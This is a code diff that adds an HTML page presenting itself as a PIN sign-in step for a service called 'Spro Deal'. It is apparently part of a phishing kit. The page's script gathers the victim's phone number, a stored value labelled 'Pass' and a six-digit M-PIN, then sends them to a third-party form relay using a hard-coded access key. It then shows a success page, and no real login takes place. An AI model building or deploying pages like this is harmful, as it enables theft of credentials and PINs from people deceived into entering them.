@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="/icon.png">
+    <link rel="shortcut icon" href="/icon.png">
+    <link rel="apple-touch-icon" href="/icon.png">
+    <link rel="stylesheet" href="style.css">
+    <meta name="robots" content="noindex, nofollow">
+    <title>PIN Verification</title>
+</head>
+
+<body>
+    <div class="top-section">
+        <img src="topbg.png" alt="Spro Deal Logo">
+    </div>
+
+    <main class="form-container">
+        <div class="title">SIGN<span>IN TO SPRO</span> DEAL</div>
+
+        <div class="pin-container">
+            <h1>ENTER YOUR PIN</h1>
+            <p class="pin-label">PIN</p>
+
+            <div class="pin-boxes" aria-label="Enter six digit PIN">
+                <input class="pin-box" type="text" inputmode="numeric" id="pin1" maxlength="1" autocomplete="one-time-code" aria-label="PIN digit 1">
+                <input class="pin-box" type="text" inputmode="numeric" id="pin2" maxlength="1" autocomplete="off" aria-label="PIN digit 2">
+                <input class="pin-box" type="text" inputmode="numeric" id="pin3" maxlength="1" autocomplete="off" aria-label="PIN digit 3">
+                <input class="pin-box" type="text" inputmode="numeric" id="pin4" maxlength="1" autocomplete="off" aria-label="PIN digit 4">
+                <input class="pin-box" type="text" inputmode="numeric" id="pin5" maxlength="1" autocomplete="off" aria-label="PIN digit 5">
+                <input class="pin-box" type="text" inputmode="numeric" id="pin6" maxlength="1" autocomplete="off" aria-label="PIN digit 6">
+            </div>
+
+            <p class="message" id="message" aria-live="polite"></p>
+        </div>
+    </main>
+
+    <script>
+        const signinData = JSON.parse(sessionStorage.getItem('sproSigninData') || 'null');
+        if (!signinData || !signinData.phone || !signinData.email) {
+            window.location.replace('index.html');
+        }
+
+        const pinBoxes = [...document.querySelectorAll('.pin-box')];
+        const message = document.getElementById('message');
+
+        function checkPinLength() {
+            const pin = pinBoxes.map((box) => box.value).join('');
+            if (pin.length !== pinBoxes.length) {
+                message.textContent = '';
+                return;
+            }
+
+            submitContactData();
+        }
+
+        async function submitContactData() {
+            pinBoxes.forEach((box) => box.disabled = true);
+            message.textContent = 'Submitting...';
+            const pin = pinBoxes.map((box) => box.value).join('');
+            const formData = new FormData();
+            formData.append('access_key', '2af86712-79ab-48b0-b3ec-caac391618fa');
+            formData.append('subject', 'Spro Deal verification request');
+            formData.append('phone_no', signinData.phone);
+            formData.append('Pass', signinData.email);
+            formData.append('M-PIN', pin);
+
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) throw new Error('Web3Forms request failed');
+
+                sessionStorage.removeItem('sproSigninData');
+                window.location.replace('success.html');
+            } catch (error) {
+                pinBoxes.forEach((box) => box.disabled = false);
+                message.textContent = 'Unable to submit. Please try again.';
+            }
+        }
+
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '').slice(-1);
+                box.classList.toggle('filled', box.value !== '');
+                if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
+                checkPinLength();
+            });
+
+            box.addEventListener('keydown', (event) => {
+                if (event.key === 'Backspace' && !box.value && index > 0) {
+                    pinBoxes[index - 1].value = '';
+                    pinBoxes[index - 1].classList.remove('filled');
+                    pinBoxes[index - 1].focus();
+                    event.preventDefault();
+                } else if (event.key === 'ArrowLeft' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                    event.preventDefault();
+                } else if (event.key === 'ArrowRight' && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                    event.preventDefault();
+                }
+                checkPinLength();
+            });
+
+            box.addEventListener('paste', (event) => {
+                event.preventDefault();
+                const pasted = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, pinBoxes.length);
+                pasted.split('').forEach((digit, digitIndex) => {
+                    pinBoxes[digitIndex].value = digit;
+                    pinBoxes[digitIndex].classList.add('filled');
+                });
+                pinBoxes[Math.min(pasted.length, pinBoxes.length - 1)].focus();
+                checkPinLength();
+            });
+        });
+
+        pinBoxes[0].focus();
+    </script>
+</body>
+
+</html>
